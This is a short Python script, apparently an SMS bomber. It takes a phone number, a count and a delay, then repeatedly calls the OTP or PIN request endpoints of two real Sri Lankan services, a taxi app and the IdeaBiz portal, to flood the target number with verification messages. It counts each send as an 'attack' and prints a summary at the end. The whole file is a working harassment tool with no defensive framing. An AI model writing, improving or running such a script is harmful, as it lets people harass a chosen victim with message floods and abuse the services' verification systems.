import time
from requests import post

num = input(">> Enter Mobile number with 0: ")
time.sleep(0.2)
F = int(input(">> Count: "))
T = int(input(">> Delay: "))

# Counters for each service
yogo_count = 0
ideabiz_count = 0

def spm():
    global yogo_count
    url = 'http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body = {'countrycode': '94', 'mobile': num, 'name': 'santha', 'email': ''}
    post(url, data=body)
    yogo_count += 1

def spm1():
    global ideabiz_count
    url = 'https://portal.ideabiz.lk/v2/user/otpRequest'
    head = {'Host': 'portal.ideabiz.lk'}
    body = {"method": "ANC", "msisdn": "94" + num[1:]}
    post(url, headers=head, json=body)
    ideabiz_count += 1

for i in range(1, F + 1):
    spm()
    spm1()
    
    total_attacks = yogo_count + ideabiz_count

    # Print the updated counts for Yogo, IdeaBiz, and the total number of attacks
    print(f"\rAttacked By Yogo    - {yogo_count} ", end='')   # Update Yogo attack count
    print(f"\rAttacked By IdeaBiz - {ideabiz_count} ", end='')  # Update IdeaBiz attack count
    print(f"\rAttacks            - {total_attacks} ", end='')  # Update total attacks count
    time.sleep(T)  # Delay between attacks

# Print the final summary at the end
print(f"\n\nSummary:\nYogo Attacks: {yogo_count}\nIdeaBiz Attacks: {ideabiz_count}\nTotal Attacks: {yogo_count + ideabiz_count}")
